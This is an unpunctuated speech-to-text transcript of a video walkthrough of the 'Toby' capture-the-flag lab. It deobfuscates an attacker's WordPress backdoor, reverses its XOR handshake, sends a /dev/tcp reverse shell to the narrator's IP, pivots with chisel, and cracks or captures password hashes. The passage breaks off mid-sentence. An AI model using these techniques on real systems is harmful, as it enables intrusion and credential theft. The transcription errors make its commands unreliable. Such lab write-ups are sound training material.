 what's going on youtube this is ipsec i'm doing toby from hack the box which is a really unique type of box because a lot of it is incident response you're pretty much kind of reversing a bunch of bad implants from an attacker so it starts out finding a backup to the website you download all the source code you can find an attacker has put a malicious line of code in the wordpress comment field so if you leave a special comment the server connects back to you and does a special handshake that you kind of have to reverse in order to get the server to execute commands once you do that you land in a docker environment you do some pivoting around eventually get to the host as a low priv user and find a malicious pam backed or that is pluggable authentication module i believe and it allows for a backdoor password across all users however the way it does it allows you to brute force the backdoor password one character at a time so with that being said let's jump in as always we're going to start with an end map so dash sc for default scripts sv enumerate versions oh a i'll put all formats bring the nmap directory and call it toby and then the ip address of 1010 11.121 this can take some time to run so we've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server then we have http on port 80 it's running engine x also tells us it's ubuntu and the http title tells us this is a wordpress site and now this is really weird i've never really seen wordpress running on nginx so i may do a little bit of googling in the back just like think there's any security implications i don't believe there are so we're not going to show it in this video but i mean that stood out to me when i was doing this box so let's go take a look at the website going to 1010 11.121 oh we just get this weird page and wordpress loves doing absolute url so every link you can see is going to wordpress.toby.htb so let's go and add that to our host file so view uh v etsy host then we can do 10 10 11 121 toby.hdb and wordpress.tobe.htb refresh the page and we get a blog about horses it looks like and a message saying hey i'm back and saw my pictures i managed to get all them back after the attack because i had them up in the cloud so i'm guessing this is going to be some type of post compromise box because there was an attack that's what he's told us so far we can take a look at wp-admin and try like logging in we can try like admin admin um admin horse try some things we don't really get anywhere but we know sub domains are going to be a thing so let's try doing a brute force on a subdomain so i'm going to do go buster v host dash u http toby.htb the word list we're gonna do opt set list discovery dns and then we want to do sub domains top million let's do the top 20 000 sure that sounds fine dash o we'll call it gobuster.vhost.out and let this run while we kind of poke at it well we don't even have to let it run too long we have a backup.toby.hdb so let's take a look at this um under sudo vi etsy host we can say backup.toby.hdb see what this page is so backup toby hdb and it looks like it is a gogs instance which is like a get service so think of like github or git lab things like that so we can try registering for account so i click register and it's thinking let's try ipsec root ipsec.rocks password of password and the captcha 869066 and we'll see if we can log in so root ipsec dot rocks password of password it's thinking and there we go we log in there's nothing really here we should probably try to find a way to enumerate like the gogs version and i'm not sure off the top of my head um i'm just clicking all the links right now but i'm sure if we went to like ipsec.rocks and typed in gogs we'd find other boxes that have used this so maybe there's tips there but i'm gonna just look at the users and we see there is a user called toby dash admin and we can also see the date he joined this which may be relevant to us once we get a show on the box we can like look for files created around august 28 2021 but um the main thing is this toby admin and if i look at how goggs does my username it's just backups.therapy.htb ipsec so i'm going to try toby-admin and it should bring us to his repository and if we go to public activity we don't see anything so if i had created a repository let's see if i can do that real quick um let's see how do i do this i've never really actually used this software other than trying to exploit it so my repository let's add a new one to see exactly how this works i will call this one please subscribe and then create it and we could make it unlisted so um if you saw there there was a private and unlisted so that's pretty interesting i'm guessing private means you need access to view it unlisted just means it's not going to show up in your repositories so maybe we should try to look for unlisted repositories for toby admin um we can see the structure it's just ipsec slash please subscribe if i do one that doesn't exist it gives us this 404 i do want to see if this is actually a 404 message so curl dash v then we can do htp backup.toby.htb ipsec slash junk and then just pipe this over to less um see i think it should tell us the headers up top if not we'll just use um which we'll call it burp suite but no we do see the headers it is giving us a 404 page so we can just run go buster against this so go buster dir you http backup.toby.hdb slash toby dash admin and then the word list of opt sec list discovery uh webcontentraftsmallwords.txt [Music] and we can see if we get any actual repositories from this and while we go to uh wait for that to run we can go to toby dash admin again and see if there's any types of hints so we get his email address we could follow him but i don't think that's really going to do anything it does put things in our feed and i don't know um where our feed actually is it's probably under the like dashboard see there's anything there um nope we can just see our feed exist of please subscribe the repository we created so we do see there is a hit on backup so if i go to slash toby dash admin slash backup see what we have we have a backup repository it looks like and wordpress.tobii.htb so let's clone this real quick get clone and then i just noticed something interesting um it looks like gitlab itself is not case sensitive so we could have done the lower case word list to get through a uh brute force a bit quicker so if i went to like ipsec we have the please subscribe repository right once this actually loads it's all in lowercase but if we did something crazy like p l e a s e sub scribe like this it should oh whoops we have to say slash ipsec should bring us to the repository because this is not case sensitive so that is interesting even though this is linux it's not a case sensitive for the url but we have the backup directory we go here we have wordpress so in wordpress i always look for the wp config so let's cut that um cat wp config.php and then there should be a password somewhere here we go so root and only the best secrets go in shell scripts is the password so let's try logging into the wordpress blog now so i'm going to try admin post this we can try toby um let's look at the user that actually wrote the post see if it's admin or toby so we click here and it should tell us the author uh by toby so the username is toby and we paste that password it didn't work so now at this point um i'm trying to think well he got attacked so i wonder if he backed up a um malicious file like someone put a back door in it so i'm gonna do a search for php um malicious file scanner and i've probably typed that but we have this so anytime i do like a web assessment um i always try to find like a malware scanner or something to hunt for backdoors uh we couldn't hunt for it for just grep like grepping for dangerous functions but really uh the tools do a much better job so let's run this so if i do scan it's going to go in my current directory so we can do a h to see how this works we want to specify d for directory so d let's go up a directory and put it into the wordpress that we downloaded then let's see base64 we probably want line number so i'm going to do a dash capital l as well and we do see total malware identified for but we have all these okays so if we do the help again there is a dash dash high dash ok option and now we see four things so line 5712 of this file so let's take a look whoops did not mean to try to kill that good thing it didn't so less than colon five seven one two go to this line and this doesn't look interesting let's actually do vi actually so we have syntax highlighting if i look at 5712 i don't really see like any dangerous functions here like that looks fine um if i don't see anything in any of these files that's where i'm going to go back and look and wp-docker.php that sounds fishy to me like is that a default wordpress file if we look at line 121 this is doing an eval of config extra i don't know exactly what this is but if we can figure out how to get data into this um wordpress config extra directory we can um get an eval so that's interesting uh we include this by default because reverse proxying is extremely common oh so that comment is towards exported so i'm actually let's see let's do a graph dash b eval on this file uh b too i'm going to google this real quick to see if this file actually exists or we can just search for the name wpconfig.php is this a legitimate file or is this malicious it looks like it is legitimate and does indeed have an eval so eval if you don't know would let you execute php codes if you put php code in this variable it executes it um looks like a backdoor but apparently that one's just wordpress so let's go to the next one we got comment.phpline3405 so let's do a vi 3405 and this looks like we have a winner this is definitely malicious we have a base64 d code rot13 and a gzip uncompress so that looks malicious but there's only one left so let's take a look at this 3036 so vi three or 36 and this split string by white space it doesn't look nearly as malicious as the other thing so let's start with the comment.php what i'm going to do is a grep on eval of that file grab the very last line in case there were multiple and i'm going to put it as malware.php so if we look at malware.php we can add a php tag and then change this eval to a print statement and then when we execute it we get itself what let's go to the top come on where's the top search for php of course php exist here there we go so this begins with a5w and it's got eval so i'm thinking this is just compressed over top of each other right um look at malware.php a5wu i'm going to move malwa.php to toby make dirt analyze cp here let's move malware to analyze stay a bit more organized if i've run this let's call this malware1.php and if we uh if i head dash 1 is going to be the same so let's split our pane less malware.php less malware 1.php so this is beginning with a5wu this is just uw so this is a different file so we could try decompressing it again so if i do v malware.malware1.php we replace the eval with a print like that php malware1.php and oh god we have more so let's look at malware2.php and this is definitely different it begins with equals but i'm sensing like a little rabbit hole here of just a bunch of um encrypted payloads probably obfuscating like antivirus or something like that so let's script this out and normally i'd probably try to find some like online solution um because there is a chance in this whole process that the malware actually executes on my system because i'm only going to look for the exact statement and change that to a print so if for some reason they decided to use eval instead of exec in one of these it can lead to code execution on my machine so i'd always do this navm and then also i would um make a snapshot before and after i run this because this is going to be one of those really stupid things you can do um and to get things started in bash you can do like math so if i do one plus one like this we can see it echoes two so with that being said i'm going to do a four i n sequence one through a hundred so what that's going to do is loop through all the numbers 1 through 100 i'm going to set dash i to replace something in a file we're going to search for eval and we're going to replace it with php print like that and the file is going to be malware i dot php and then we will execute php malware malwarei dot php and direct it to malware i plus one dot php and then done so before i run this let's just echo what i want to do so if i bash test.sh um maybe i need to put this in single quotes because i think i just echoed something to a file yeah okay well that sucks i probably screwed something up because now we have a hundred malware files if i look at php malware.php that should be fine right okay so let's remove malware 0 to 9 star.php now we just have one let's create the very first one so malware1.php and now when i run this test it's going to take this one and make all the new files so let's see what happens so i removed the echo statements since that looked fine and it's running we have looks like a lot of malware.phps and around 79 it looks like oh actually 80. 88 looks like it stops so after 80 it's all three three five so if i cat malware 99 dot php we actually have a file so let's look at malware99.php and vi we can put the php tag so we have syntax highlighting then i'm also going to replace all semicolons with a new line and then a semicolon uh replace all semicolons with a semicolon then a new line uh replace semicolon with semicolon new line there we go and then we can put the php tag and go over this so i'm just like trying to clean up this code so we have an if then i'm going to put a line break after every and and so we can see what's happening because we're not trying to execute this code this is the one we're just analyzing right so if the comment author is help toby.htb and the author url is test.derby.hdb and the first eight characters equal 746 f6279 then do this so here we're making a equal i think everything after eight characters we're going to split upon a semicolon and have host and sec and then we're going to call this we'll include this wordpress comment validate which i assume gives us this function i'm guessing wp validate 403 exists in this file and it passes these two variables so let's go find backup and i'm going to grep for validate and we don't find anything that sucks um let's see if we go back and analyze the malware what was that file did i save it yeah 99 so i'm going to look well i looked at validate so i don't see this we can grep dash r for this so let's graph dash dashr4034a3 inside of backup and we don't have anything so what we're looking there is does this function exist in our script or in the backup it doesn't so our back door doesn't look like it was backed up so we don't have this function so this is just a php script because it's including it and then inside of this php script is this function so we just gotta guess what this function is um if we go here we have leave a comment and we have uh comment name email website and this wants us to have email and stuff so let's put the emails help at toby.htb the url let's put that the name i'm just gonna put toby even though it did not say we want a that's doing first and then we got host and security so what i'm going to do is say 10 10 14 8 and then we put a semicolon to split these two 9001 so here's the secret key here is oh god secret key then we do ip address we're going to do us and then i'm going to assume it talks on port 8001 i'm also going to send this to verb suite so we can replay this and i just enable dark mode and burp suite if you want to do that it's under user options display and the theme but intercept is on let's click post comment send it over to repeater and i'm going to listen on 9001 we send it we get error2 and nothing so the next thing i want to do i just want to wireshark this real quick so i'm going to do pseudo wireshark i'm going to look at ton zero and i'm actually going to kill the skill buster because that is flooding or output there we go so now let's send this request and we have two things so i'm looking at every send packet so sin means we're initiating the connection it doesn't send act back to us acknowledging the sin and we send a hack so that's the tcp three-way handshake we can see us we're making the request we start with a sin but here we see the server initiating a send to us so it's creating a separate connection right here and we send it reset act because we're not listening on the port so if we look here we can see um it's trying to connect to 2005 i bet if we click here the source port is this ephemeral one and destination port is two zero zero five three so i'm going to stand up a um netcat on 20053 and then let's do this again send this and we get something so this looks like a guide to me just because like i recognize the format of hex dash hex dash hacks whatever like this is definitely a python guide or maybe not python but just a guide in general um it's a global unique identifier so this would be like a uuid potentially but uuids they can repeat just because there's not a lot of entropy right but a guide globally unique is meant to be unique across the whole database so it's much longer then we have a bunch of text i'm going to guess this is hex so if i did echo this xxd-r-p we can see it says xor key and then gives us more hex so i'm going to do the same thing echo dash n or we didn't even have that dash n we just did echo then xxd dash r dash p and we just have strings and its entropy is four bits per byte so i know this is not random um this is just ascii if you wanted to use like cyber chef we could do that as well so gchq cyber chef go to github or go to google uh let's turn burp suite off that's not the right page here it is we could have done the same thing so if we just took this whole thing did from hex you get this xor key put this huh that's different weird dc8 dc8 i'm not sure what's going on there um but we have this output the one thing we don't know right now is what that second parameter was so i'm just going to simple xor real quick i'm going to do 9001 and we see it says key underscore prefix d key suffix so the reason why i did 9001 is because in this we're doing comment 10 10 14 8 and then i did port 9001 but it looks like that is the key and it's also worth mentioning this is hex so i bet if i just like did not do something that was valid hex like put a um z in here this whole thing would break um we can try that real quick so what we're listening on 2053 we go into burp suite let's just do z see what happens we get bad requests it doesn't even do this it just errors out so if i did 0 0 which is nothing it's not even going to do this one xor [Music] it's weird i must have changed something that i did not realize i changed let's try this again it's easy so it does come but it does a 500 error when it does a 500 error does it do anything it connects to us and doesn't send data so if we don't give it valid hex that's what happens if i give it 0 0 it's still going to send us a guide and then a bunch of information and we do this xxd thing again or echo xxd dash r dash p we get this xor key if we do this again we get the key and suffix so because we did an xor of zero here then it's doing nothing it's like rotating zero bytes and we don't have to worry about that xor so this one piece is weird now though um it's not closing the connection after it does this right so if i do this let's get this whole key let's grab this see what the prefix is if i just go to cyber chef take this key put it in it is key s suffix so what we need to do here is let's do another xor real quick so i'm going to open a second thing to cyber chef and i'm going to do id and we're going to xor that with what was the key capital s and i'm going to change this to be utf-8 and colon 7. so if i send this colon 7 it's going to send me data back and if i put this data here this looks like it's hex so let's uh from hexa we get the output of this it's cmd colon this so we have a way to execute commands on this box now the issue is going to be um if we do any complex command we may not be as lucky and get a reverse shell because it can be outside of the ascii thing it's going to be hard to copy so we can try this by like um c bash dash i dev tcp 10 10 14 8 9001 like this and i don't see any periods so we may get lucky here let's just send this real quick and see lvnp 9001 send that and we get the reverse shell we just screwed up so let's go back to this command we want and one like that so if i paste this in we get a shell now i'm going to go back and script this out because it really depends what key you get because you can rotate something into a non-ascii value and if you do that then the command's just not going to work you could just keep doing this until you get a good key that's val doesn't break your command but i'm not going to depend on that so let's exit this out real quick and we'll close this and create a python script so let's do vi bd.pi to call it like backdoor.pi and i know we could use the socket library but i use pen tools so much it's just what i'm comfortable with and i forgot to import um we can google like pwn tools listen socket and then go to the first result and see how to generally do it we do a listen wait for connection and then receive line so i'm just going to copy this because wave connection is a pain to type l is equal to listen the port was two thousand two zero zero five three then we want to wait for connection and then we can say r is equal to l dot receive line like that and i'm just gonna print r and we'll see um what happens so do this and we get um a blob so we have the guide and this we need to decode this and also split on a pipe so i'm going to do what is it r is equal to r.d code and then i'm going to dot split on the pipe and grab the very first one so we run this send it again and now we just have this blob so we need to convert this blob into um from hex to something else and what was it do we have any dividers no we just have this so we can do r is equal to bytes.from hex r dot decode like this and now we need to split on a semicolon so put this in parenthesis dot split semicolon one and that gives us more hex so we can just print this out and now we got the key suffix so we want to split on underscore so 0 1 2 and grab the second one dot split underscore two and now we have the xor key so now we can send it a command um let us create a function so define zor and i'm going to say um cmd and k will be key and i know there's probably like a list comprehension or lambda function that will be able to do this in one line but for the sake of understanding it i think splitting up in multiple lines is easiest so i'm going to do four character in cmd or we can just put this um this text yeah we can just do text or input input's a word um let's do text or input's a function like in python input as a function so that'd be a very bad one to do okay so our four character in text i'm going to say output is append the following to output and we want to take the ordinal value of the character and xor it with the ordinal value of the key and then convert it all into a character so these convert it into numbers so if i python 3 word a converts it into the ordinal value and then if you care 65 converts it into the ascii character so that's what that's doing okay so here we can now do cmd is equal to xor and let's do our um bash command so i go to cyber chef we can say this and then the key we're going to put we can call this instead of our call this key like that and then l dot send line cmd so if this works then this will send us a reverse shell and um this listens on the port waits for the connection um we get good blob and then the next thing is receive xor blob and then this is receive key prefix something key suffix so essentially that's what this is doing so let's try this is it going to work the first time i doubt it but it's always worth i hope it does python3 bd.pi waiting for the connection let's send it and none type nothing has no attribute in code let's see what line was that let's try it again i have zz and my burp payload i wonder if that was it now let's go back here oh in my extra function i'm not returning anything i have a z i don't know how i keep putting that z there function is not iterable line 20. so does not like that l.sen line print cmd let's just make sure i extort something and that's not what i wanted i have returned azure return output there we go now this should work the silly mistakes you make when you just like are talking and typing or just doing things there we go so now we have a shell uh python3 dash c import pty pty dot spawn then bash python command not found which python uh there's no python uh which python 3.8 ls user ben grapp pi um which script okay we have script so we can do a script dash q send the script to dev null dash c bash and then um control z s t t y raw minus echo fg enter enter and now we have tab autocomplete so it's just like the python pty but we use script instead just a different way to do it it's less characters so maybe people prefer this way i don't like showing this that often because the python one sticks out more in a ps output and in the videos i generally don't show a bunch of opsec but when we need to we can right so let's export term is equal to x term clear the screen and figure out what we're doing next her host name is wordpress we can see that here so chances are we're in like a docker container or something because it's not like derby.hdb looking at slash we do see docker environment or the docker env and then this entry point dot sh that just starts up wordpress and it looks like it is moving comment.php over top of the wordpress one so this is the backdoored version i would guess um we also have ftp started which is weird um ftp was not on our box when we do ss lntp uh not found let's try netstat dash i think aln or something netstat's not found so this docking container is extremely minimal um we could potentially go into like the slash proc uh not database but like file system or whatever this is and go into net and this is where all those commands like netstat ss um let's see ip and if config aren't here so like all these tools pull information out of this um do we have art we don't even have the arp command but if i cat this art file in proc net we can see various hosts so 102 100 103 104. i'm going to guess our host is 103 because we have the hardware address set to all zeros so this is most likely going to be us maybe it's not but um i think it is the other files we could try let's see um i always like putting at the top let's see wonder what dev is if dev is anything interesting uh localhost zero bytes packets errors so if we looked at ifconfig thing we have things like um rx packets bytes things like that so this is probably where ifconfig is pulling it from but not good to us because it's not telling us the actual um addresses so there's probably going to be definitely one that does i wonder what netlink is cat netlink uh that's not it netstat this one may be it but that's a lot of information for me to go through um i wonder if we just do tcp well what's stat lstat let's just do tcp and we get a lot of information i'm going to bless it with dash capital s oh my god les is not here um i was hoping to like just make it so it's just on one line but oh well um so if i cat what is it tcp we can see these are ip addresses um they're just hex encoded so this is 7f is 127 0 0 and 0b and hex is 1. if we do like cyber chef let's go here uh do this say from hex um i wonder if we have to say zero x actually let's just do a ipconverter so hex2ip go to google convert hex to ip address put this in convert to ip zero b is eleven not one but one twenty seven zero zero eleven is what this guy's listening and then nine c for f um i wonder if i can just echo zero x like this four zero zero one five is i think the port um 50 this is going to be a more common port i want to say 50 is 80 in decimal it is and that was listening on all hosts so we have this one this is a different like ip address we got ac45 so if we paste this we have 172 69 0 101. and this port what is this port c712 this is probably going to be like it talking to my sequel so 50 962 and where was that one we're looking at c712 it's talking to this guy on port 4e55 i think this is another high number port two zero zero five three so this is definitely our ip address we're definitely um 101 and if i cat we're not here so our assumption of 103 being us is wrong because we are definitely 101. um i say definitely because this address is 172 69 0 101 talking to probably me this is zero as 10 10 14 8 on 253 so this is definitely us this is a 127 this is the same so our ip address is 101 which leaves a few we have 102 103 104. so at this point we probably should open up chisel and set up a port forward so i'm going to github chisel and we'll download the linux one so let's see not arm where is amd there it is right at the top it has been downloaded and then we can do we have a www directory we don't we can make one move downloads chisel gzip dash d and then um i'm just going to rename chisel to be chisel python3 dash m http server to download it and i wonder if we're going to have wget or curl we haven't had any luck with what binaries but let's try w get 10 10 14 8 8 000 chisel curl we do have curl 10 10 14 8 8 000 chisel dash o chisel there we go and we have to start chisel um server mode but um it's not executable yet so let's make it executable chmod plus x chisel there we go so we can do server dash p 8001 and we want to allow reverse connections uh file download the wrong one gosh darn it i even said amd and i downloaded darwin amd uh linux amd i think i've made the mistake once before actually so let's move downloads chisel to chisel we have to give it the gzip extension so we can decompress it uh gzip dash d chmod plus x chisel okay so now we can do server port 8001 reverse there we go that looks better and we have it downloaded here so chmod plus x chisel and we can do dot slash chisel client 10 10 14 8 8 000 1 r colon sucks and we have permission denied and that's probably because dev shm has no exec you can see that right here so let's move chisel to temp and run that same exact command and when we downloaded it we downloaded the um darwin one so let's go back to our curl download it then ch mod it and run it there we go i think we have a socks proxy up so we should be able to go to firefox in my foxy proxy i want to say how do you have it configured but we should let's see we can look at this configuration that's not it there we go manage extension how do i manage this i've done it before preferences there we go um if we look at proxy 8001 we can see the sucks is pointed here and it's a sox5 so this looks fine and the ip address was 172 69 100 to like 104. so let's just see if there's any um [Music] thing listening here so 100 i'm not getting anything 101 i'm not getting anything is my proxy not working um we can check that easily with sudo vi etsy proxychains.com and we will proxy it through proxy chains with curl uh was that eight thousand one let's put a sox five eight thousand one okay proxy chains curl one what was the ip 172 69 172 69 0 101 and we can't connect to it because i'm guessing chisel is actually listening on 1080 not 8001 there we go yep that's it so let's just change this port to 1080 save and i can change proxy 8001 let's do 1080. so if i look at the chisel output i'm guessing it's going to tell me what it's doing yeah so chisel itself is listing on 8001 but this is accepting clients and if i paid attention to this i would see it set up a sox thing on port 1080. so now with this on 1080 if i get a 172 69 101 we get the blog so if i do 100 we get nothing let's try 102 nothing i think 103 was another one we could do 103 is taking a little bit longer but we still get nothing 104 we get jack's personal web app so maybe we have something here it's trying to connect to cloudflare right now um i wonder let's see so where can not do that let's see proxy send dns no save and edit patterns all urls so let's call this one toby and we'll say 172.star save so now we're no longer going to be sending this cloudflare through a proxy and it loads but man that is some horrible links if we click on password generator useful links and notes it's still loading links we get pizza it's linking us to things um can i change this well there we go i wonder if that was on or something no i had it off putting this on works a lot better so we have pizza wordpress my sequel this plugin i have i think it's dark reader yeah notes we can see something basic nothing interesting password here's your password what is my password i am confused looking at this idpw it's making a get request to api password so we can try this and it's just giving us this string is it gonna change it looks like it changes every request i'm just saying control r so not sure what we do with this it's just giving us a random password um i'm going to get another reverse shell on this box real quick so we can continue enumerating through wordpress so nclvnp9001 if i just execute bd.pi and we go into burp suite you should get another shell script q dev null dash c bash stty raw minus echo fg it export term is equal to x term clear and now we can look through things um since it's doing password i'm going to look at this wordpress password so if i cat wp-config dot php uh grep i pass we can see the password is still only the best secrets go in shell script so that was the same exact thing we had from the actual source code i'm guessing there's probably a um database though and we can extract no less man let's see so root db name so dbhost is mysql.tobii.hdb and the username is root so let's grab this mysql do we have this binary we do not but we can proxy change it so proxy chains mysql do we yeah we have the binary okay i was like do we not have the binary on our computer but no we do so my sequel um i want to say lowercase h and we should ping mysql.tobii.htv was it it's really curl my sequel toby.htb port 80 refused see dig there we go that one is 102. so 172 69 0 102 and then we can do um dash u root dash p and let's get that password again paste it in and we log in so we can do show databases use wordpress we can also go into gogs so let's do show tables um select i think username let's just do describe hold on describe wp users select user underscore login user underscore pass from uh what was it wp users and we have two different hashes so if we vi hashes.txt we can say toby colon and copy this and then toby dash admin and copy this okay so the next step is to go into hashcat and we can try to crack these hashes so i'm going to ssh to the kraken because i don't like cracking on my local box we can go into hashcat then go into hashes hashes.txt paste these in then we can do hash cat and then dash dash user because in the hashes file we have the user colon and then the hash um now we specify the hashes so hashes hashes.txt and then the word list is optwordlistdrocu.txt so it's going to start in auto detect mode and it detects it as a php pass which is good and it's going to try to crack them we can see the time it's going to take oh it already recovered one um if we go up where is the one here we go we have one as toby keith one and what's the time for the other one uh it's gonna finish any second now so i'm just gonna let this finish so we can see what the username is and this is why i like doing that dash dash user flag now because if i just take off the word list and do show it's going to tell me toby dash admins password is toby keith one so we could also go in the gogs repo and try to crack it as well but i'm just gonna try logging into gogs with this so if i sign out of me sign in was it toby dash admin and we put this credential in we have repositories so i'm going to clear out all this so we oh we probably should have left that one um reopen close tab there we go because that's a different site that we know but just cleaning up my tabs we have two different apps support system db and personal web app so if we look at this it's just a db file um see if we go here does it just download view raw save file let's try viewing this so make their support system move what is that file name called support so downloads support system here file to see what type of file this is sqlite so sqlite3 then dot dump and there's a lot of encrypted things or blobs at least so let's see we have user text support submit encrypted blob and encrypted id so it looks like this whole database is pretty much encrypted we have email so jack this is the date so this is just an epoch timestamp but these things are encrypted blobs so i wonder if that other application we have access to this personal website has anything about that um there should be a download thing right i'm just download the whole thing as a zip and let's move that here so move downloads and what did it download as personal web app then unzip uh personal web app actually maker web app just in case it tries to clobber our current working directory i always like making new folders when i unzip things and this one looks fine so we can just move this up and clean that up okay so we have an app.pi and templates so let's take a look at the app.pi and we can see it's just a flask application it looks like there is a health check at api db test we have this api password thing if you remember on this notes i think this is where we actually hit api password let's make sure we're set through the proxy first so do this and we hit it and we get this so i think there's also a db test and access denied for jack well we don't have jack's credentials so we want to get them so let's take a look at that db test thing and it looks like if secret db test is in request.args and validate ip secret db test 9ef then hostname is equal to this so i think we can make this connect back to us so secret db test so if we do question mark secret db test zero nine e f is equal to ten ten fourteen eight i think this will set our host name equal to us so let's try this real quick um nc lvmp nclvmp3306 run this and we get a connection so um we can potentially extract the um hash from this connection much like any like ntlmv2 thing this is going to be mysql but let's see if we can extract the hash so i'm going to do a pseudo service my sequel start i'm going to start my sequel on a box so nc if we do ss lntp grep3306 we can see my sequel is started i think if i do a pseudo it'll actually tell us that is maria db and now i'm going to go back to my wireshark so sudo wireshark and i'm going to look at the authentication packet so let's send this again and i want to do tcp dot port is equal to 3306 and this is the my sequel traffic so here's the box connecting to us this actually translated my sql so we have the protocol um host tobii dot t http is not allowed to connect to this mariadb server so we have to go edit my sql to allow this host um so let's see how do we do that sudo my sequel uh wait what that's not for root oh did i set a password once upon a time that's gonna suck so i don't know what my root password is let's see my sequel reset password let's take a proxy off and hope this doesn't take too long to reset um i know we put it in like safe mode and then reset it right so let's see kill my sequel so we can just stop it so sudo service my sequel stop okay create a password file vpw.text root at localhost identified by i'm going to put the password as please subscribe okay and then we set the inet file so sudo mysqld init file is equal to let's do home ipsec hdb toby pw.text so mysql has started and it used that file so ps let's do a ss lntp grep3306 it's still listening if i do a pseudo my sequel dash p please subscribe sweet we get in so i should have just left myself in but now we want to create a new user so create user jack at um 10 10 11 was it 121 uh let's see what the host is cat etsy host grep toby yep that is it identified by please subscribe i know we have the wrong password here but this should allow um jack to be able to log in to us flush privileges i think is what i have to run and now let's restart wireshark to clear this and if we go back here what does wireshark show uh we have to set the proxy there we go and we have a login request this is what i wanted to see so we have jack and the password is this hash 9904 i wonder if we have like a salt or anything but it doesn't look like it unless it's all zeros so that's server greeting ah maybe that's the salt we got multiple salts this is getting confusing but we have this password or if there's a way we can just crack this so i'm going to google the my sequel native password in hashkat so my sequel native password hash cat crack and again we have to take this proxy off tell it to use google and it looks like we do have potentially something that's mode 300 i don't think that's it let's see i don't see anything here i wonder if i put the underscores nope i'm going to do hashcat example hashes and we're going to look at everything mysql so we have this which is too short [Music] and i don't think it's that version we have 4.1 and 5. this looks ok do we have a version in this so this is 10 5 9 maria db1 i wonder if that 5 is this so 300 is potential and then we have this my sequel cram and i remember this from crypto um where we have this my sequel n a and then this is the salt this is the hash and i want to say it is going to be this one and i think we actually go to the greeting and take both of these salts and combine them and then put this as the hash [Music] we can kind of verify that it's actually using the salt by doing a second login request and seeing if this hash changes if this hash changes then we know um we need more information than just a hash to crack this i always forget to put this back on so now see we have login request jack we do this one so it begins with 994 this is 94a so this hash is changing so we know we need more information than just this because the salt is changing what the password is so i'm going to take both of these so can i just copy value let's see yep so i'm going to do mysql.txt i'll call this actually mysql toby.text paste that and let's get this other salt right here and we can copy the value and if we go to the hashcat example hashes we need to put this before it and then we put i think another oh we put a star not a dollar and now we can put the hash so let's go to the login request grab this copy value and put this and i think that is correct um i'm going to cat it and then we'll put it over on the kraken and see if we can crack it so copy ssh kraken let's go back into hash cat v hashes i'll call this toby dot text i guess and then we want to do dot slash hash cat dash mode this is going to be 11 200. we probably don't have to specify this because of auto detection hashes toby.txt opt wordlist rocky.text and see if we get anything and token length exception so it did not like this v hashes toby.text i wonder if we can convert this into hex because that's kind of how this is showing is that is definitely an hex so my sequel and a dollar this stir that um i don't think so but that is certainly possible where is a wire shark i wish there was a salt in this client capabilities now so let's see i'm going to copy this value then let's go and convert that into hex on cyber chef so gchq cyber chef turn off input two hex that looks short i'm gonna have to put both of them oh we can just change the delimiter instead of doing that delimiter none there we go so what is it saying this length is so echo dash n wc-c that is 40. so that's definitely a shot one sum unless like i just got unlucky with that this is not that's 24. so if i did both of these salts that server capabilities copy value does this now magically become 40 characters echo n i think it does that is looking promising so let's try adding that bam that looks better it's starting and we're attempting to crack so we passed the validation so that's what it was we had to take both those salts convert them to hex and then throw them into hash cat um a bit weird but it's fine and we have no hits yet we're almost done but spoiler i know this isn't going to work um if we let's see where is my shell on this box did i get rid of it let's see uh we want to go ah right here is where i wanted um if we go to the personal web app we can look at app.pi and if we look at the comments we can see removed creds and placed in environment so we don't have any credentials here we want to try to extract this environment variable of db password now if we look at this api password we can see it's pretty much making a password based upon the time so i'm going to make a word list that starts at um i guess this is july 10th of 2021 i'm guessing it's day day month month year year because this one's staying the same this is incrementing um it could be month day year but they just like always update the script on the seventh of the month and pick random months i don't think so so um we want to get an epoch time for 10 721 so epoch time generator and there's probably a way we can do this in python i know there is but this is the quickest way right so let's do um 1007 2021 everything uh i guess year zero am invalid hour go to a 20 oh um i guess 12 a.m there we go epoch timestamp is going to be this so we just need to create a new word list and we can just pretty much take the python script there let me get out of the crack in here so we have it all on one line we can close wireshark and we can say dot pwgen.pie it's going to import string and then we can say cares is equal to string dot ascii letters plus string dot digits then random dot seed is equal to this will be i i guess and we can say for i in range that and i wanna say we should do seven nine nine two how many do we wanna generate um i wonder if we change this to seven if that's going to be crazy we'll see how big this creates it random seed that and then we want to copy that password so less password we can just copy this and we can do print password so python3 oh we have to no i think we're good i was reading time down here and thinking we have to um change time but there's one import we missed import random because random.choice is a library so python3 pw gen invalid syntax because we fought forgot a semicolon that's looking good to word list so now we have a custom word list and i want to say um if we do a wc-l on it and we cat word list unique dash see it uh let's see crap dash v actually i was thinking maybe would like go in a loop but it doesn't look like it does but since that generated pretty quick let's make this a bit bigger so we changed three three we can leave this at a five and put a five here so let's see how much bigger this makes her file if it doesn't make it all that much bigger we'll go with it if it does we'll change what we did but i think we just exponentially increased it um i should have done a small word list first and seen if it worked but bit off too much that i could chew so three we can just change this to nine there we go so get this is that going to generate there we go i'm going to scp word list to kraken and i'm actually going to call it toby dashboard list and if we ssh to it we can move toby word list to opt or list and go into hashcat hashcat then hashes toby hopped wordless toby word list um we're already in auto detect mode so it should find that one hash and hopefully we recover the password which we do not so something went wrong maybe we don't have the right hash or maybe we don't have enough words or maybe we just screwed up the time so let's take a look at this again if i do pw gen on not that v what is it app.pi looking at the comments july 10th oh i reversed this 0710 so there we go we got a different epoch timestamp hopefully this fixes it so if we v pw gen we can replace the range and let's see instead of that one six two five eight let's do um [Music] six one maybe like that that should create a pretty big word list two word list and let's see hopefully i didn't make this word list too big uh it's a little smaller than the last one but let's try sap word list i wonder how many that's going to be let's see how long is that seconds to days that's three days so if that like what was the exact comment so if this was done anywhere between july 10th and july 13th if the credential was set then we should be able to have the password in this because we've just enumerated all passwords for three days um hopefully this makes sense sap word list 2 kraken opt word list is it list with the l r s then toby dash word list okay and then we run this and hopefully we get a recovery recovered one out of one so that is good if i do show we can see the password is for die and then all this stuff so let's do vi pw just so we save it there and let's try ssh again so i'm going to do jack at 10 10 11 121 accept the fingerprint and we don't get an accept however remember there are like three different docker containers so let us try going into those um let's see i guess we can use um [Music] what is it chisel i just want to make sure i get the ip address so i'm in one container i think it was 172 69 0 100 but um always like to be sure so if we look at tcp we can take this ip actually we can just do cat arp our cat proc net and we want to go from probably 100 to 104 with those credentials so proxy chains jack at well proxy chains that way and 172 69 0 100 connection refused 101 refused 102 it accepts it and we get into the my sequel let's just try 103 real quick 104. so 102 is the only one we can 